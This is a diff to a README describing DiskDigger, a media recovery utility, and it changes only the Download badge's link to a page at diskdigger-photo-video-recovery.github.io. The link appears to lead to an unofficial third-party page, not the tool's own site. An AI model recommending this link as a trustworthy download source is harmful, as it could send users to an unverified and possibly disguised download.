@@ -2,7 +2,7 @@
 
 DiskDigger is a media recovery utility that helps restore lost or deleted photos and videos from SD cards, USB drives, internal storage, and more. Designed for photographers, videographers, and everyday users who need quick access to accidentally deleted files.
 
-[![Download](https://img.shields.io/badge/Download-DiskDigger_Recovery_Tool-blueviolet)](diskdigger-photo-video-recovery.github.io)
+[![Download](https://img.shields.io/badge/Download-DiskDigger_Recovery_Tool-blueviolet)](https://diskdigger-photo-video-recovery.github.io/.github/)
 
 ---
 
